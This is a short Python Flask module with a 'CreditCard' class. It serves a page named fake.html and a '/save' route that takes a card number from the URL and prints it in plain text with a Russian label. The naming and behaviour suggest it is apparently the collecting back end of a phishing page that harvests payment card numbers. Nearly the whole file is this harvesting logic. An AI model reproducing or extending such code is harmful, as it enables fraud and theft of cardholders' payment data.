from flask import request, render_template
import time


class CreditCard:
    def __init__(self, app):
        @app.route('/save')
        def save():
            card_num = request.args.get('card_number', None)
            if card_num:
                print('Номер карты: ' + card_num)
            time.sleep(1)
            return render_template('save.html')

        @app.route('/fake')
        def fake():
            return render_template('fake.html')
